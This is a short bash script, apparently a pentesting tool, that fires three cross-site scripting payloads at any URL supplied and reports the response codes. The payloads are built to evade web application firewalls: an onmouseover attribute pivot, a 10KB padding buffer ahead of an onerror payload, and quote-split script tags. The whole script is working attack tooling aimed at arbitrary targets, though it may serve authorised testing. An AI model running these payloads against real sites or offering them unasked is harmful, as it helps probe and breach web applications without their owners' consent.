#!/bin/bash
# [WITCH-HUNTER] BYPASS_WORKER.SH - TCM METHODOLOGY
# Memorized Logic: Pivot [00:05:32], Pad [00:07:13], Desync [00:09:00]

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: bypass_worker.sh <url>" && exit 1

echo "--- [ STARTING TCM BYPASS PROBE: $TARGET ] ---"

# 1. ATTRIBUTE PIVOT (Mouseover Bypass)
echo "[+] Probing: Attribute Pivot (onmouseover)..."
curl -X GET "$TARGET?q=<img src=x onmouseover=prompt(1)>" -s -o /dev/null -w "Result Code: %{http_code}\n"

# 2. PAYLOAD PADDING (10KB Buffer Bypass)
echo "[+] Probing: 10KB Payload Padding..."
PADDING=$(printf 'A%.0s' {1..10000})
PAYLOAD="${PADDING}<img src=x onerror=prompt(1)>"
curl -X POST -d "q=$PAYLOAD" "$TARGET" -s -o /dev/null -w "Result Code: %{http_code}\n"

# 3. INTERPRETER DESYNC (Quote Splitting)
echo "[+] Probing: Interpreter Desync (s'c'r'i'p't)..."
curl -X GET "$TARGET?q=<s'c'r'i'p't>alert(1)</s'c'r'i'p't>" -s -o /dev/null -w "Result Code: %{http_code}\n"

echo "--- [ PROBE COMPLETE ] ---"
